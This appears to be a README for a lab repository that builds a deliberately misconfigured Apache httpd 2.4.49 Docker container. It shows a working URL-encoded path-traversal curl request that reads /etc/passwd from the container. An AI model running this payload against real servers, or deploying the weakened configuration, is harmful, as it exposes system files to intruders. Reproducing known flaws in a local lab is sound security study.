thx to:

Daniel https://twitter.com/dhauenstein

Schniggie https://twitter.com/schniggie/status/1445425766141992963

They only change to the original config is that I commented out this block:

https://github.com/ramshazar/apache-path-traversal/blob/main/exploitable-httpd.conf#L248-L251


```
bash-3.2$ git clone https://github.com/ramshazar/apache-path-traversal.git
Cloning into 'apache-path-traversal'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 1), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (9/9), 8.24 KiB | 844.00 KiB/s, done.

bash-3.2$ ls
apache-path-traversal

bash-3.2$ cd apache-path-traversal/

bash-3.2$ docker build -t exploit-apache-httpd .
[+] Building 0.3s (7/7) FINISHED
 => [internal] load build definition from Dockerfile                                                                                                                                                                                                                                                                                             0.0s
 => => transferring dockerfile: 129B                                                                                                                                                                                                                                                                                                             0.0s
 => [internal] load .dockerignore                                                                                                                                                                                                                                                                                                                0.0s
 => => transferring context: 2B                                                                                                                                                                                                                                                                                                                  0.0s
 => [internal] load metadata for docker.io/library/httpd:2.4.49-buster                                                                                                                                                                                                                                                                           0.0s
 => CACHED [1/2] FROM docker.io/library/httpd:2.4.49-buster                                                                                                                                                                                                                                                                                      0.0s
 => [internal] load build context                                                                                                                                                                                                                                                                                                                0.0s
 => => transferring context: 20.86kB                                                                                                                                                                                                                                                                                                             0.0s
 => [2/2] COPY exploitable-httpd.conf /usr/local/apache2/conf/httpd.conf                                                                                                                                                                                                                                                                         0.0s
 => exporting to image                                                                                                                                                                                                                                                                                                                           0.0s
 => => exporting layers                                                                                                                                                                                                                                                                                                                          0.0s
 => => writing image sha256:1e20b720de8ddbcf40d4351475161c0cf31436c84a76853bb3f15699a84ec541                                                                                                                                                                                                                                                     0.0s
 => => naming to docker.io/library/exploit-apache-httpd                                                                                                                                                                                                                                                                                          0.0s

bash-3.2$ docker run -d -p80:80 exploit-apache-httpd
3f8a38dedc3a1684b49191c9deef3c8b9a374982727f36dea62e49d9fcb5c6b5

bash-3.2$ curl --path-as-is http://localhost:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
